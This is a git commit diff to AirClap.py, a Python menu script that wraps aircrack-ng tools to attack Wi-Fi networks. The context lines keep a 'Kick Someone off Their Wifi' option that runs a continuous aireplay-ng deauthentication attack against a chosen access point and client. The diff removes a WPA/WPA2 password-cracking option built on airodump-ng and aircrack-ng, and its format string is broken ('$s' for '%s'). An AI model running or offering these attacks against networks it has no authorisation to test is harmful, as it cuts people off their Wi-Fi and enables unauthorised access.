4f0f504f35129e6b4a08169f1f221bf650c58dea
Josiah Crofton <44535515+jobro247@users.noreply.github.com>
2018-11-24 23:06:14 -0800

    Update AirClap.py

--- AirClap.py
+++ AirClap.py
@@ -8,8 +8,7 @@ while True:
   print ("Scan For Networks /a")
   print ("Start Monitor Mode /b")
   print ("Kick Someone off Their Wifi /c")
-  print ("Crack a wpa2, wpa wifi password /d")
-  print ("Scan for clients /e")
+  print ("Scan for clients /d")
   print ("-------------------------------------------")
   main_choice = raw_input("I choose:")
   if main_choice == 'a':
@@ -34,12 +33,6 @@ while True:
       aireplay_client = raw_input("Enter the client you want to target:")
       os.system("aireplay-ng -0 0 -a %s -c %s wlan0mon" % (p, aireplay_client))
   if main_choice == 'd':
-    os.system("airodump-ng wlan0mon")
-    path = raw_input("Enter the path your pcap file:")
-    b = raw_input("Enter the bssid of the network your trying to crack:")
-    wordlist = raw_input("Enter the path for the wordlist:")
-    os.system("aircrack-ng -w $s -b $s $s" % (wordlist, b, path))
-  if main_choice == 'e':
     r = raw_input("Enter the bssid of the network your targeting")
     e = raw_input("Enter the channel of the network your targeting")
     os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (e, r))
